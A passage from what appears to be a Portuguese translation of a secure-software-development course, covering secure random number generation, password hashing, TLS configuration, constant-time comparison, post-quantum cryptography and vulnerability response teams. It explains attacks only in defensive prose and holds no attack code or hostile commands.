</table> <p>Se você precisar semear (e isso é um mau sinal), certifique-se de que os invasores não consigam adivinhar o valor da semente. Algumas pessoas semeiam algoritmos PRNGs criptograficamente seguros com dados de data/hora, o que é uma vulnerabilidade; em muitos casos, os invasores podem facilmente adivinhar as datas/horas prováveis.</p> <p>Existe uma solução simples: usar um CSPRNG e usar hardware para fornecer dados corretamente a ele. A maioria dos kernels de sistemas operacionais atuais fornece números aleatórios criptograficamente seguros, coletando ruído ambiental de vários dispositivos de hardware e implementando um CSPRNG.</p> <p>Se você estiver executando em bare metal (em vez de um kernel de sistema operacional), geralmente existem bibliotecas reutilizáveis ​​que você pode usar para essa finalidade. Esses números aleatórios criptograficamente seguros podem ser usados ​​diretamente ou como uma semente segura para um PRNG criptograficamente seguro.</p> <p>Por exemplo, o kernel Linux fornece valores numéricos aleatórios criptograficamente seguros por meio de sua chamada de sistema <strong>getrandom</strong> , bem como os arquivos especiais <strong>/dev/urandom</strong> e <strong>/dev/random</strong> .</p> <p>Na maioria dos casos, você deve usar a chamada de sistema <strong>getrandom</strong> quando for prático, ou o arquivo especial <strong>/dev/urandom se</strong> <strong>getrandom</strong> for difícil de acessar (por exemplo, a partir de um script de shell). Eles geram valores aleatórios criptograficamente seguros usando um CSPRNG e a entropia coletada pelo kernel.</p> <p>Em circunstâncias especiais, como a criação de uma chave criptográfica de longa duração, você pode usar <strong>/dev/random</strong> ou a opção equivalente em <strong>getrandom</strong> ; isso força o kernel a esperar (bloquear) até que tenha uma alta quantidade estimada de entropia interna. O objetivo de <strong>/dev/random</strong> é garantir que haja uma grande quantidade de entropia interna, mas o bloqueio pode ser indefinido em algumas circunstâncias e geralmente não é necessário.</p> <p>O importante é que um invasor não consiga adivinhar o valor aleatório, nem o valor dessa estimativa de entropia interna (veja <em><a href=https://www.2uo.de/myths-about-urandom/ >"Mitos sobre /dev/urandom"</a></em> de Thomas). No futuro, pode não haver diferença entre <strong>/dev/random</strong> e <strong>/dev/urandom.</strong></p> <p>Um problema de segurança particularmente grave em sistemas computacionais são <em>os geradores de números aleatórios inseguros</em> .</p> <p>Um gerador de números aleatórios inseguro produz valores aparentemente corretos, mas destrói a segurança de todo o sistema. Muitas falhas em sistemas criptográficos têm sido atribuídas à geração incorreta de números aleatórios, em parte porque pode ser difícil detectar o problema.</p> <p>Em muitos casos, usar geradores de números aleatórios inseguros é um erro não intencional, mas, em alguns casos, organizações <em>intencionalmente</em> subvertem geradores de números aleatórios.</p> <p>Por exemplo, em 2020, foi revelado que a CIA dos EUA, em cooperação com a inteligência da Alemanha Ocidental, era proprietária da empresa Crypto AG e havia vendido amplamente produtos criptográficos que haviam sido intencionalmente subvertidos, em pelo menos alguns casos, por adulteração da forma como geravam valores "aleatórios". Veja <em><a href=https://www.washingtonpost.com/graphics/2020/world/national-security/cia-crypto-encryption-machines-espionage/ >"O golpe de inteligência do século",</a></em> de Greg Miller, para mais informações.</p> <p>A geração insegura de números aleatórios é um problema especialmente sério em softwares de dispositivos de Internet das Coisas (IoT). Um relatório de 2021 descobriu que cerca de 35 bilhões de dispositivos de IoT apresentavam vulnerabilidades de segurança desastrosas devido à geração insegura de números aleatórios criptográficos. Isso ocorre em parte porque muitos desenvolvedores de software de IoT acionam diretamente os geradores de números aleatórios de hardware (eles não deveriam fazer isso), mas, pior ainda, ignoram os códigos de retorno de erro desses geradores (e <em>definitivamente</em> não deveriam fazer isso).</p> <p>Os geradores de números aleatórios de hardware normalmente têm taxas de geração facilmente excedidas, de modo que podem gerar números aleatórios apenas em velocidades limitadas. Se os usuários lerem muito rápido, o gerador provavelmente relatará erros. No entanto, apenas prestar atenção ao código de erro do hardware não é suficiente.</p> <p>O hardware às vezes falha e, se o software simplesmente travar nesse caso, o dispositivo de IoT pode ser muito instável para competir. O código de exemplo para acessar o hardware do gerador de números aleatórios costuma ser inseguro (mostra como obter dados, mas não como usá-los corretamente).</p> <p>Usar o hardware diretamente e corretamente pode ser bastante difícil. Por exemplo, a página 1.106 (de 1.152) do manual do usuário do LPC 54628 observa, de forma confusa, que, após ler um número aleatório do hardware, é necessário ler e descartar os próximos 32 valores. A mesma pesquisa também mostra que geradores de números aleatórios de hardware de processadores populares usados ​​em produtos de IoT não geram dados totalmente aleatórios. Um teste de aleatoriedade pode ser usado para verificar se os números gerados são realmente aleatórios.</p> <p>Desenvolvedores de software para dispositivos IoT não devem acessar os registradores de hardware diretamente, mas devem, em vez disso, chamar geradores CSPRNG bem elaborados que usem corretamente fontes de hardware (de preferência múltiplas fontes) como entradas em seu pool de entropia interno.</p> <p>Na maioria dos casos, os desenvolvedores de IoT devem usar um sistema operacional de IoT que inclua uma implementação CSPRG corretamente semeada a partir de múltiplas fontes de hardware e simplesmente verificar se ela parece ter sido cuidadosamente escrita para segurança. Onde isso não for prático, use uma biblioteca CSPRNG bem elaborada e analisada que inclua o software correto para extrair valores aleatórios do seu hardware; não <em>implemente</em> sua própria criptografia a menos que você seja um especialista em criptografia.</p> <p>Os desenvolvedores de software de IoT também devem executar testes estatísticos em seu mecanismo de geração de números aleatórios para garantir que eles sejam aleatórios, porque este é um problema especialmente comum em dispositivos IoT.</p> <p>Para mais detalhes, veja <em><a href=https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng>You're Doing IoT RNG</a></em> ( <a href="https://www.youtube.com/watch?v=Zuqw0-jZh9Y">apresentação</a> ) de Dan Petro e Allan Cecil, uma apresentação da DEF CON de 2021.</p> <p>Em resumo: certifique-se de usar um gerador de números aleatórios pseudoaleatórios (CSPRNG) criptograficamente seguro e robusto, devidamente implementado, com múltiplos valores de hardware, sempre que precisar de um valor que um adversário não possa prever. Você deve procurar uma função que diga ser um gerador de números aleatórios "seguro" ou "criptográfico".</p> <p>Não use um gerador de números "aleatórios" comum, como qualquer gerador congruencial linear (LCG), documentado para esses fins.</p> <p>Se você precisar de um número criptograficamente aleatório em um intervalo (por exemplo, um inteiro de 0 a um número N), NÃO use simplesmente os operadores de módulo ou resto. Muitos programadores <em>acreditam</em> erroneamente que é aceitável usar diretamente os operadores de módulo ou resto (por exemplo, '%' ou 'mod' em muitas linguagens) para esse propósito.</p> <p>No entanto, isso frequentemente faz com que alguns números sejam mais prováveis ​​do que outros, um problema chamado <em>viés de módulo</em> . O viés de módulo pode, às vezes, levar à exploração do sistema. (Yolan Romailler, <a href=https://research.kudelskisecurity.com/2020/07/28/the-definitive-guide-to-modulo-bias-and-how-to-avoid-it/ >O guia definitivo para “Viés de Módulo e como evitá-lo"!</a> ).</p> <p>Se você precisar de um número criptograficamente aleatório em um intervalo, não use operadores de módulo ou resto diretamente. Em vez disso, use uma função existente que forneça números criptograficamente aleatórios <em>imparciais</em> em um intervalo.</p> <p>A maioria das bibliotecas CSPRNG fornece essa função — basta verificar se ela é imparcial. Se você precisar implementar isso sozinho, existem vários métodos, como amostragem de rejeição, <a href=https://dotat.at/@/2020-10-29-nearly-divisionless-random-numbers.html>números aleatórios quase sem divisão, de acordo com o algoritmo de Daniel Lemire</a> , ou <a href=https://dotat.at/@/2022-04-20-really-divisionless.html>números aleatórios sem divisão, de acordo com Steve Cannon e Kendall Willets</a> .</p> <p>No entanto, normalmente você deve usar apenas a função da biblioteca CSPRNG que fornece essa função.</p> <h2 id=armazenando-senhas>Armazenando senhas<a class=headerlink href=#armazenando-senhas title="Permanent link">¶</a></h2> <p>Uma necessidade comum é implementar um serviço e/ou aplicativo de servidor e precisar que o usuário autentique e/ou comprove que está autorizado a fazer uma solicitação. Isso se chama <em>autenticação de entrada</em> . Aqui estão três abordagens comuns para isso:</p> <ol> <li>Delegue essa determinação a outro serviço. Você precisa confiar nesse outro serviço e precisa de uma especificação para comunicar isso. OAUTH e OpenID são duas especificações comuns para fazer a solicitação ao outro serviço. Geralmente, você usaria uma rotina para implementar isso; certifique-se de aplicar suas diretrizes de segurança. Isso pode ser conveniente para os usuários, mas lembre-se de que isso revela todos os logins naquele serviço externo (uma questão de privacidade) e certifique-se de que você pode confiar nesse serviço.</li> <li>Exija que o solicitante tenha uma chave privada que comprove sua identidade. SSH e HTTPS suportam isso. Uma grande vantagem dessa abordagem é que, no lado do servidor, apenas uma chave pública precisa ser registrada; portanto, embora a integridade seja importante, a confidencialidade das chaves não é tão crítica. No entanto, isso requer que o usuário configure essa chave privada.</li> <li>Suporte a login baseado em senha (pelo menos em parte).</li> </ol> <p>Se você implementar a opção 3, que oferece suporte a logins baseados em senha (pelo menos em parte), terá muita companhia. Senhas têm muitos problemas conhecidos, mas são problemas conhecidos. Se você for usar senhas, pelo menos em parte, precisa fazê-lo corretamente.</p> <p><strong>Cuidado</strong> ao armazenar senhas de forma insegura. Um banco de dados repleto de informações de senhas é um alvo tentador para invasores. Na prática, muitos invasores conseguiram obter bancos de dados com informações relacionadas a senhas (por exemplo, invadindo o serviço ou obtendo um backup). Um sistema seguro <em><strong>deve</strong></em> ser projetado para que invasores não possam explorar facilmente os bancos de dados de senhas do lado do servidor, mesmo quando conseguem recuperar uma cópia. Aqui estão algumas abordagens que NÃO <strong>funcionam</strong> :</p> <ul> <li>Armazenar senhas "à vista" (sem criptografia). Obviamente, se um invasor obtiver esses dados, poderá usar todas as senhas. <strong><em>Não faça isso!</em></strong></li> <li>Hashing de senhas (por exemplo, com MD5, SHA-1 ou SHA-256). Os invasores têm ferramentas que podem usar força bruta para adivinhar bilhões de senhas, fazer o hash de todas e compará-las com os valores hash, portanto, isso não protege as senhas. <em><strong>Não faça isso!</strong></em></li> <li>Hashes saltados por usuário. Isso combina a senha com um valor aleatório por usuário, chamado de "salt", e então gera um hash da combinação. O problema é que os algoritmos de hash modernos são tão rápidos que os invasores ainda conseguem adivinhar bilhões de senhas e, muitas vezes, encontrar a senha de um usuário. Novamente, <em><strong>não faça isso!</strong></em></li> </ul> <p>Se você estiver usando senhas para autenticação de entrada, por motivos de segurança, deverá usar um tipo especial de algoritmo para essa finalidade, chamado <em>algoritmo de hash criptográfico com sal iterado por usuário</em> . O termo "iterado" também é chamado de derivação de chave. Três algoritmos são comumente usados ​​como algoritmo de hash criptográfico com sal iterado por usuário:</p> <ul> <li><strong>Argon2id:</strong> A menos que você tenha um forte motivo para usar outro algoritmo, este é o ideal hoje. Ele é relativamente forte contra ataques baseados em software e hardware.</li> <li><strong>Bcrypt:</strong> Este é um algoritmo decente contra ataques baseados em software. Não é tão fácil de atacar com hardware, comparado ao PBKDF2 (porque o bcrypt requer mais RAM), mas é mais fraco contra ataques baseados em hardware em comparação ao Argon2id.</li> <li><strong>PBKDF2:</strong> Este é um algoritmo decente contra ataques baseados em software, mas é o mais vulnerável entre os algoritmos amplamente utilizados a ataques baseados em hardware de circuitos especializados ou GPUs. Isso porque pode ser implementado com um circuito pequeno e pouca RAM. Talvez você não precise substituí-lo (dependendo dos tipos de invasores que o preocupam), mas provavelmente é melhor evitá-lo em novos sistemas hoje em dia.</li> </ul> <p>Outro algoritmo em uso é o scrypt. Ele também deve ser forte contra ataques de hardware, mas não recebeu tantas avaliações quanto o Argon2id; portanto, o Argon2id é mais comumente recomendado. Dito isso, no momento em que este artigo foi escrito, não há problemas sérios conhecidos.</p> <p>Todos esses algoritmos têm diversas opções de configuração, e é vital usar um conjunto de opções adequadamente seguro. O <a href=https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html>Guia de Armazenamento de Senhas da OWASP</a> fornece um conjunto de valores de opções de configuração recomendados.</p> <p>Você deve permitir que os usuários exijam o uso da autenticação de dois fatores (2FA), diretamente ou delegando a um serviço que o faça.</p> <p>Além disso, tome cuidado ao implementar esses algoritmos apenas no lado do cliente. É aceitável implementá-los no lado do cliente (porque isso impede que o servidor descubra a senha inserida pelo usuário), desde que <em>também</em> sejam implementados no servidor.</p> <p>O perigo é implementá-los <em>apenas</em> no cliente; se isso acontecer, o que é armazenado no servidor não é diferente de armazenar senhas em texto simples. Assim que os invasores obtêm o banco de dados de senhas, eles podem simplesmente criar ou modificar seu próprio cliente para acessar a conta de qualquer pessoa.</p> <h2 id=seguranca-da-camada-de-transporte-tls>Segurança da Camada de Transporte (TLS)<a class=headerlink href=#seguranca-da-camada-de-transporte-tls title="Permanent link">¶</a></h2> <p>O Transport Layer Security (TLS) é um protocolo criptográfico amplamente utilizado para fornecer segurança em uma rede entre duas partes. Ele garante privacidade e integridade entre essas partes. A versão 1.3 do TLS foi lançada em 2018. Uma versão mais antiga e insegura desse protocolo era chamada de Secure Sockets Layer (SSL), e às vezes os termos são usados ​​de forma intercambiável.</p> <p>Quando você usa <strong>https://</strong> em um navegador ou servidor hoje em dia, normalmente está usando TLS (em casos raros, você pode estar usando seu antecessor inseguro, o SSL).</p> <p>O TLS também é usado em outras aplicações, por exemplo, para proteger trocas de e-mail entre diferentes Agentes de Transporte de E-mail (MTAs).</p> <h2 id=validacao-de-certificado>Validação de Certificado<a class=headerlink href=#validacao-de-certificado title="Permanent link">¶</a></h2> <p>Para usar o TLS corretamente, o lado do servidor precisa, no mínimo, de um certificado (para provar a clientes em potencial que é o sistema que afirma ser).</p> <p>Você pode criar um certificado e instalar sua chave pública em cada cliente (por exemplo, navegador da web) que se conectar a esse servidor. Isso é bom para testes, mas na maioria das outras situações, é muito complicado. Na maioria dos casos (exceto para testes), você deve obter um certificado atribuído por uma autoridade certificadora.</p> <p>Você pode obter certificados gratuitos do <a href=https://letsencrypt.org/ >Let's Encrypt</a> . Se os requisitos do Let's Encrypt não atenderem às suas necessidades, outras autoridades certificadoras podem ser úteis.</p> <p>Quando os clientes se conectam a um servidor usando TLS, normalmente precisam verificar se o certificado é válido.</p> <p>Os navegadores da web já descobriram isso há muito tempo; eles vêm com um conjunto configurável de chaves públicas de autoridade de certificação (diretamente ou por meio do sistema operacional) e verificam automaticamente cada nova conexão TLS.</p> <p><em><strong>Atenção:</strong></em> Se estiver usando seu próprio cliente, em vez de usar um navegador da web, verifique novamente se está usando a API da biblioteca TLS <em>corretamente</em> .</p> <p>Muitas APIs da biblioteca TLS <em>não</em> verificam completamente o certificado TLS do servidor automaticamente. Por exemplo, elas podem permitir conexões com um servidor quando não há certificado de servidor, podem permitir qualquer certificado (em vez de um certificado para o site ao qual você está tentando se conectar) ou permitir certificados expirados.</p> <p>Este é um erro extremamente comum ( <em><a href=https://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf>O Código Mais Perigoso do Mundo: Validando Certificados SSL em Softwares que Não São de Navegador</a></em> , por Martin Georgiev, 2012).</p> <p>Se este for o caso, você pode estar usando uma API TLS de baixo nível em vez da API que deveria usar.</p> <h2 id=ciphersuites>Ciphersuites<a class=headerlink href=#ciphersuites title="Permanent link">¶</a></h2> <p>O TLS, como protocolo, combina muitas das partes que discutimos. No início da comunicação, as duas partes devem negociar para determinar o conjunto de algoritmos (incluindo os comprimentos das chaves) que será usado para a conexão. Esse conjunto de algoritmos é chamado de conjunto <em>de cifras</em> . Isso significa que, para fins de segurança, é importante ter boas configurações padrão e configurar o software corretamente ao implementá-lo.</p> <p>Se você estiver configurando um site HTTPS, um ótimo lugar para obter as configurações recomendadas atualmente é o site <em><a href=https://wiki.mozilla.org/Security/Server_Side_TLS>TLS do lado do servidor/Segurança</a></em> da Mozilla . Uma decisão importante a ser tomada é se você deseja a configuração moderna, intermediária ou antiga:</p> <ul> <li><strong>Moderno</strong>: Mais seguro, mas um número não trivial de clientes pode não conseguir se conectar a ele.</li> <li><strong>Intermediário</strong>: Uma configuração de compromisso que permite que clientes um pouco mais antigos se conectem, ao mesmo tempo em que fornece uma segurança razoavelmente boa.</li> <li><strong>Antigo:</strong> Uma configuração que oferece a melhor segurança possível e suporta clientes e bibliotecas muito mais antigos. Sua segurança é muito mais fraca que a intermediária.</li> </ul> <p>No momento em que este artigo foi escrito, a <em>configuração intermediária</em> era recomendada na maioria dos casos, mas verifique o site para obter atualizações.</p> <p>Você notará que qualquer configuração possui uma lista de conjuntos de cifras TLS em ordem de preferência.</p> <p>Por exemplo, TLS_AES_128_GCM_SHA256 significa que o TLS deve usar o Padrão de Criptografia Avançada (AES) com chave de 128 bits no modo Galois/Contador (GCM), combinado com o algoritmo de hash seguro de 256 bits (SHA-256).</p> <p>Após a implantação do sistema, você deve testá-lo. Se o site for visível publicamente, é uma ótima ideia usar o teste gratuito da Qualys, chamado <a href=https://www.ssllabs.com/ssltest/ >Teste de Servidor SSL</a> .</p> <p>Ele é chamado de "Teste de Servidor SSL" porque esse é o nome antigo do TLS, mas não se engane, ele funciona bem com TLS (e reclamará se você permitir os protocolos SSL vulneráveis).</p> <h2 id=obtendo-conselhos-criptograficos>Obtendo conselhos criptográficos<a class=headerlink href=#obtendo-conselhos-criptograficos title="Permanent link">¶</a></h2> <p>Neste curso, tentamos fornecer alguns conceitos básicos e informações suficientes para aplicá-los em diversas circunstâncias. Talvez o mais importante, no entanto, sejam os conselhos principais: não crie seus próprios algoritmos ou protocolos criptográficos, nem crie suas próprias implementações. Em vez disso, reutilize algoritmos, protocolos e implementações respeitados. Ao configurar a criptografia, procure conselhos atuais e respeitados. Exemplos dessas fontes incluem <em><a href=https://wiki.mozilla.org/Security/Server_Side_TLS>o site Security/Server Side TLS</a></em> da Mozilla , o NIST (especialmente a Recomendação do NIST <em><a href=https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r5.pdf>para Gerenciamento de Chaves: Parte 1 – Geral</a></em> ) e <em><a href=https://tools.cisco.com/security/center/resources/next_generation_cryptography>a Criptografia de Próxima Geração</a></em> da CISCO . Os criptógrafos nem sempre concordam sobre o que é "melhor" (como em qualquer outra área), mas os especialistas serão capazes de apontar o que está claramente quebrado e o que é amplamente considerado muito mais seguro.</p> <h2 id=algoritmos-de-tempo-constante>Algoritmos de Tempo Constante<a class=headerlink href=#algoritmos-de-tempo-constante title="Permanent link">¶</a></h2> <p>Há um tópico importante que ainda não mencionamos: algoritmos de tempo constante, especialmente comparações de tempo constante. Muitos algoritmos levam um tempo variável dependendo dos dados. Por exemplo, se você quiser determinar se duas matrizes são iguais, normalmente essa comparação para no primeiro valor diferente.</p> <p>Aqueles que desenvolvem bibliotecas criptográficas devem implementar seus algoritmos de forma que o tempo que levam não varie com base nos dados de entrada (isso não é trivial, embora possível, com AES). A maioria dos desenvolvedores nunca aprende a fazer isso, então este é um dos muitos motivos pelos quais você não deve escrever sua própria biblioteca criptográfica. No entanto, há uma variação que pode ocorrer com frequência fora dessas bibliotecas: às vezes, você precisa lidar com comparações de arrays de forma especial.</p> <p>As operações normais de comparação (como <strong>is-equal</strong> ) tentam minimizar o tempo de execução, o que às vezes pode vazar informações de tempo sobre os valores para os invasores. Se um invasor enviasse dados repetidamente e percebesse que a comparação de um valor que começa com "0" leva mais tempo do que um que não começa, então o primeiro valor comparado deve ser "0". O invasor pode então adivinhar repetidamente o segundo dígito, depois o terceiro e assim por diante. Muitos desenvolvedores acreditam incorretamente que não é possível para invasores explorarem variações de tempo em uma rede; essa é uma crença falsa que os invasores adoram explorar. A estatística moderna se mostra notavelmente poderosa para remover variações de latência; os invasores realmente <em>podem</em> explorar essas latências.</p> <p><em>Comparações de tempo constante</em> , também chamadas de <em>comparações de tempo fixo</em> , são comparações (geralmente de igualdade) que evitam o vazamento dessas informações de tempo. Essas comparações sempre levam o mesmo tempo com base puramente no comprimento dos dados e <em>não</em> levam tempos menores para valores de dados diferentes com o mesmo comprimento. Elas não são o mesmo que operações O(1) em ciência da computação. Exemplos dessas funções de comparação de tempo constante são:</p> <ul> <li>Node.js: <strong><a href=https://nodejs.org/api/crypto.html#cryptotimingsafeequala-b>crypto.timingSafeEqual</a></strong></li> <li>Ruby on Rails: métodos <strong><a href=https://api.rubyonrails.org/classes/ActiveSupport/SecurityUtils.html>ActiveSupport::SecurityUtils</a></strong> <strong>: secure_compare</strong> e <strong>fixed_length_secure_compare</strong></li> <li>Java: <strong><a href=https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/security/MessageDigest.html#isEqual(byte%5B%5D,byte%5B%5D>MessageDigest.isEqual</a></strong> (presumindo que você não esteja usando uma versão antiga do Java). Usuários do Google Guava também podem usar <strong><a href=https://github.com/google/guava/blob/master/guava/src/com/google/common/hash/HashCode.java#L371>HashCode::equals.</a></strong></li> <li>C# / .NET: <strong><a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.cryptographicoperations.fixedtimeequals?view=netcore-2.1">Operações Criptográficas.Tempo FixoEquals</a></strong></li> <li>C/OpenSSL: <strong><a href=https://docs.openssl.org/master/man3/CRYPTO_memcmp/ >CRYPTO_memcmp</a></strong></li> </ul> <p>Sempre que comparar valores secretos ou criptográficos (como chaves de sessão), use uma <em>comparação de tempo constante</em> em vez de uma comparação normal, a menos que um invasor não consiga explorar o tempo normal de comparação. Você não precisa fazer isso com um hash salt iterado, calculado em um ambiente confiável (como o seu servidor), pois o invasor levará muito tempo para criar os valores correspondentes. Você <em>precisa</em> fazer isso se estiver comparando chaves de sessão diretamente com um valor armazenado, pois os invasores <em>podem,</em> às vezes, iterar para descobrir cada dígito na chave de sessão.</p> <h2 id=minimizar-o-tempo-em-que-as-chavesdados-descriptografados-existem>Minimizar o tempo em que as chaves/dados descriptografados existem<a class=headerlink href=#minimizar-o-tempo-em-que-as-chavesdados-descriptografados-existem title="Permanent link">¶</a></h2> <p>Lembre-se de que, por privilégio mínimo, queremos minimizar o tempo em que um privilégio está ativo. Em criptografia, muitas vezes queremos minimizar o tempo em que uma chave privada ou senha fica disponível, ou pelo menos minimizar o tempo em que os dados descriptografados ficam disponíveis. Isso pode ser mais difícil do que você imagina. No nível do sistema operacional, você provavelmente pode bloqueá-los na memória com <strong>mlock()</strong> ou <strong>VirtualLock()</strong> ; isso pelo menos impedirá que os dados sejam copiados para o armazenamento. O ideal é apagá-los da memória após o uso, usando interfaces seguras para esse propósito. Os otimizadores de compiladores podem eliminar silenciosamente o código para sobrescrever os dados, pois detectam que nada lê os valores sobrescritos. Além disso, linguagens com coleta de lixo integrada geralmente fazem cópias extras silenciosamente e/ou não fornecem um mecanismo para apagamento. Dito isso, algumas linguagens ou infraestruturas facilitam isso. Por exemplo, aqueles que usam o framework .NET (por exemplo, C#) podem usar SecureString. As seguintes interfaces em C e C++ são mais seguras para sobrescrever dados confidenciais na memória:</p> <ul> <li>Linux: <strong>explicit_bzero</strong></li> <li>Windows: <strong>SecureZeroMemory</strong></li> </ul> <h2 id=computacao-quantica>Computação Quântica<a class=headerlink href=#computacao-quantica title="Permanent link">¶</a></h2> <p>Uma das grandes incógnitas futuras na criptografia é o impacto potencial dos computadores quânticos de uso geral. No momento em que este texto foi escrito, os chamados computadores quânticos <em>de uso geral</em> já existiam, mas eles não eram poderosos o suficiente para ameaçar os algoritmos criptográficos atuais. Não se sabe se computadores quânticos de uso geral mais poderosos poderão ser construídos e, em caso afirmativo, quando isso acontecerá.</p> <p>Se computadores quânticos poderosos e de uso geral forem construídos, eles terão o potencial de quebrar todos os algoritmos de chave pública historicamente populares, usando um algoritmo chamado <em>algoritmo de Shor</em> . Como resultado, pesquisadores estão desenvolvendo novos algoritmos de chave pública que resistem a ataques desses computadores quânticos, uma área chamada <em>criptografia pós-quântica</em> . No momento em que este artigo foi escrito, muitos desses algoritmos foram desenvolvidos e estão sendo avaliados.</p> <p>Em contraste, os algoritmos criptográficos simétricos e funções de hash atuais são menos afetados por computadores quânticos. Um algoritmo de computador quântico chamado algoritmo de Grover acelera ataques contra cifras simétricas, reduzindo seu comprimento efetivo pela metade. Isso significa que o AES de 128 bits poderia ser quebrado por um computador quântico (seria então equivalente a uma chave de 64 bits hoje), mas o AES de 256 bits ainda seria seguro (seria equivalente a uma chave de 128 bits hoje). Portanto, espera-se que simplesmente usar chaves e hashes mais longos seja adequado em um mundo pós-quântico para algoritmos criptográficos simétricos e funções de hash.</p> <p>Portanto, esteja preparado para alterar quaisquer algoritmos de chave pública para resistir à computação quântica e garanta que os comprimentos das chaves sejam longos o suficiente ao usar algoritmos criptográficos simétricos e de hash. Algumas grandes organizações registram grandes volumes de tráfego da internet para posterior descriptografia [ <a href=https://irp.fas.org/program/process/rapport_echelon_en.pdf>Parlamento Europeu, 2001</a> ], portanto, se seus usuários correm risco de captura e descriptografia de dados anos depois, você deve considerar a implementação de contramedidas agora contra a computação quântica.</p> <p>Infelizmente, criar algoritmos criptográficos radicalmente novos é difícil e arriscado. Cerca de metade de todos os algoritmos de criptografia pós-quântica na competição do NIST não atingiram os níveis de segurança declarados. Um dos principais concorrentes para a criptografia pós-quântica era o SIKE (Supersingular Isogeny Key Encapsulation), mas em 2022 descobriu-se que o SIKE poderia ser quebrado por computadores não quânticos comuns [ <a href=https://arstechnica.com/information-technology/2022/08/sike-once-a-post-quantum-encryption-contender-is-koed-in-nist-smackdown/ >Goodin, 2022</a> ]. Portanto, se você estiver adicionando um algoritmo criptográfico pós-quântico, certifique-se de manter também uma camada pré-quântica para que, se uma falha for encontrada no algoritmo pós-quântico, você ainda esteja protegido contra ataques de computadores tradicionais. Essa abordagem de combinação de algoritmos é chamada de sistema "híbrido". Sistemas híbridos adicionam um pouco mais de complexidade (porque você está usando dois algoritmos), mas ajudam a combater o risco significativo de falha nesses algoritmos pós-quânticos mais recentes. [ <a href=https://blog.cr.yp.to/20240102-hybrid.html>Bernstein, 2024</a> ]</p> <h2 id=a-humildade-e-importante-na-criptografia>A humildade é importante na criptografia<a class=headerlink href=#a-humildade-e-importante-na-criptografia title="Permanent link">¶</a></h2> <p>Talvez a lição mais importante aqui seja a humildade ao usar criptografia.</p> <p>Muitos algoritmos criptográficos foram desenvolvidos no passado, apenas para serem quebrados mais tarde. É arrogância pensar que nossos algoritmos e protocolos atuais não podem ser quebrados.</p> <p>Em vez disso, você deve ter um plano para lidar com a situação quando (e não se) seus algoritmos e protocolos criptográficos estiverem quebrados. Certifique-se de que todos os seus co-desenvolvedores saibam desse plano para que não o estraguem (por exemplo, se você administra um projeto de código aberto, coloque isso no arquivo <strong>CONTRIBUTING.md</strong> ou equivalente). Em resumo, planeje a mudança.</p> <p>Da mesma forma, busque orientação de especialistas e pondere-a cuidadosamente. Erros em sistemas criptográficos podem ser devastadores e perdurar por muitos anos, pois não são óbvios. Obter avaliações e feedback construtivo de outras pessoas geralmente é uma boa ideia, mas é especialmente importante ao usar criptografia.</p> <h1 id=equipes-de-resposta-a-incidentes-de-seguranca-de-produtos-psirts>Equipes de Resposta a Incidentes de Segurança de Produtos (PSIRTs)<a class=headerlink href=#equipes-de-resposta-a-incidentes-de-seguranca-de-produtos-psirts title="Permanent link">¶</a></h1> <p>Se você faz parte de uma equipe que desenvolve um grande aplicativo de software dentro de uma única organização, então você provavelmente tem ou deveria considerar formar um grupo para lidar com incidentes de segurança relacionados a esse software. Essas equipes são às vezes chamadas de Equipe de Resposta a Incidentes de Segurança de Produto (PSIRT). O Fórum sem fins lucrativos de Equipes de Resposta a Incidentes e Segurança (FIRST) define uma PSIRT como <em>"uma entidade dentro de uma organização que... se concentra na identificação, avaliação e disposição dos riscos associados a vulnerabilidades de segurança dentro dos produtos, incluindo ofertas, soluções, componentes e/ou serviços que uma organização produz e/ou vende"</em> ( <a href=https://www.first.org/standards/frameworks/ >FIRST</a> : <em>Estrutura de Serviços da Equipe de Resposta a Incidentes de Segurança de Produto (PSIRT)</em> e <em>Estrutura de Serviços da Equipe de Resposta a Incidentes de Segurança de Computador (CSIRT)</em> ). A FIRST recomenda que as PSIRTs sejam formadas enquanto os requisitos ainda estão sendo desenvolvidos, mas elas devem ser formadas pelo menos antes do lançamento inicial do software. Uma PSIRT funcionando corretamente pode identificar e responder rapidamente a um relatório de vulnerabilidade extremamente sério.</p> <p>Os PSIRTs frequentemente trabalham com equipes de resposta a incidentes de informática (CSIRTs). Um CSIRT se concentra na segurança de sistemas e/ou redes de computadores que compõem a infraestrutura de uma organização inteira, enquanto os PSIRTs se concentram em produtos/serviços específicos. Caso você tenha um (ou queira estabelecer um), a FIRST fornece estruturas úteis que descrevem o que PSIRTs e CSIRTs devem fazer dentro de uma organização ( <a href=https://www.first.org/standards/frameworks/ >FIRST</a> ).</p> <p>Muitos governos e grandes empresas também têm seus próprios requisitos e diretrizes sobre como lidar com relatórios de vulnerabilidade. Se o seu projeto for um desses esforços, você precisará seguir esses requisitos e considerar suas diretrizes.</p> <p>Um guia rápido e simples é o <a href=https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html>OWASP <em>Vulnerability Disclosure Cheat Sheet</em></a> . Este breve documento fornece orientações úteis tanto para pesquisadores de segurança (que encontram vulnerabilidades de segurança) quanto para organizações (que recebem relatórios de vulnerabilidades).</p> <p>Existem muitos outros documentos úteis que discutem a divulgação de vulnerabilidades. Em particular:</p> <ul> <li><em><a href=https://vuls.cert.org/confluence/display/CVD/The+CERT+Guide+to+Coordinated+Vulnerability+Disclosure>Guia CERT para Divulgação Coordenada de Vulnerabilidades</a></em> , por Allen Householder, 2019. Nesse documento, o_fornecedor_é a organização que lança o software e precisa aprender sobre a vulnerabilidade de segurança.</li> <li>Diretrizes e práticas da FIRST <a href=https://www.first.org/global/sigs/vulnerability-coordination/multiparty/guidelines-v1.1>para coordenação e divulgação de vulnerabilidades multipartidárias</a> .</li> </ul> <p><a href=https://github.com/ossf/wg-vulnerability-disclosures>O Grupo de Trabalho de Divulgação de Vulnerabilidades</a> da Open Source Security Foundation (OpenSSF) desenvolveu um <a href=https://github.com/ossf/oss-vulnerability-guide><em>Guia para divulgação coordenada de vulnerabilidades em projetos de software de código aberto</em></a> . Se você mantém um projeto OSS, aplique esse guia para estar preparado para receber relatórios de vulnerabilidades <em>antes que</em> eles aconteçam.</p> <p>No restante desta unidade, discutiremos algumas das principais questões para aceitar relatórios de 